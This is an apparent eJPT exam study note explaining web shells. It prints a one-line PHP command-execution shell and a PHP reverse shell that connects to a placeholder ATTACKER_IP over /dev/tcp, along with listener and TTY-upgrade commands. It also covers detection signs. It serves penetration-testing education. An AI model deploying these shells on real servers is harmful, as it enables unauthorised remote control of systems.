# Web Shells

A web shell is a malicious script uploaded or written to a web server that allows an attacker to execute operating system commands through a web browser. Once uploaded, a web shell provides a simple command interface for interacting with the compromised server and is one of the most common methods of achieving Remote Code Execution (RCE) during web application penetration testing.

Web shells are frequently used after exploiting **File Upload Vulnerabilities**, **Local File Inclusion (LFI)**, **Remote File Inclusion (RFI)**, or vulnerable Content Management Systems (CMS). Understanding how they work is essential for the **INE eJPT** exam.

---

# What is a Web Shell?

A web shell is simply a server-side script that accepts commands from an HTTP request and executes them on the server.

Example:

```
Browser

↓

HTTP Request

↓

Web Server

↓

Web Shell

↓

Operating System

↓

Command Output
```

# Basic PHP Web Shell

The simplest PHP web shell:

```php
<?php system($_GET['cmd']); ?>
```

Upload:

```
shell.php
```

Execute:

```
http://TARGET/uploads/shell.php?cmd=whoami
```

# Reverse Shell

Instead of executing individual commands, obtain an interactive shell.

PHP example:

```php
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'");
?>
```

Start a listener:

```bash
nc -lvnp 4444
```

Execute:

```
http://TARGET/uploads/revshell.php
```

---

# Upgrading the Shell

Reverse shells are often non-interactive.

Upgrade them:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Background:

```
CTRL + Z
```

Configure terminal:

```bash
stty raw -echo

fg

reset

export TERM=xterm
```

Check size:

```bash
stty rows 40 columns 120
```

# Web Shell vs Reverse Shell

| Web Shell | Reverse Shell |
|-----------|---------------|
| Browser-based | Interactive terminal |
| One command per request | Full shell session |
| Easy to upload | More stable |
| Slower | Faster |
| Less stealthy | Better for post-exploitation |

Usually, penetration testers upload a web shell first and then use it to obtain a reverse shell.

# Detection

Indicators of a web shell include:

- Unexpected PHP or ASPX files.
- Suspicious HTTP requests containing `cmd=`.
- Outbound reverse shell connections.
- Unusual file creation in upload directories.
- Unexpected process execution by the web server.

---

# Common Mistakes

Avoid these mistakes:

- Forgetting to verify whether the uploaded file is executed.
- Using large web shells when a simple one is sufficient.
- Not upgrading to a proper TTY.
- Ignoring alternative upload directories.
- Forgetting to enumerate the compromised host.
- Leaving the web shell behind after testing.

---

# eJPT Tips

During the **INE eJPT** exam:

- Always test whether uploaded files execute as code.
- Start with a minimal PHP web shell to confirm code execution.
- Upgrade to a reverse shell for a better interactive session.
- Perform local enumeration immediately after gaining access.
- Search for privilege escalation opportunities such as SUID binaries, weak sudo permissions, or Windows privilege misconfigurations.
- Combine web shells with **Burp Suite**, **Gobuster**, and **File Upload Vulnerabilities** techniques.

# Summary

A web shell is a lightweight server-side script that allows remote command execution through a web browser. It is commonly obtained by exploiting file upload vulnerabilities or vulnerable web applications and serves as an initial foothold for further exploitation. Once command execution is confirmed, penetration testers typically upgrade to a reverse shell, perform local enumeration, and search for privilege escalation opportunities. Understanding web shells, their deployment, and post-exploitation workflow is an essential skill for both real-world web assessments and the **INE eJPT** exam.
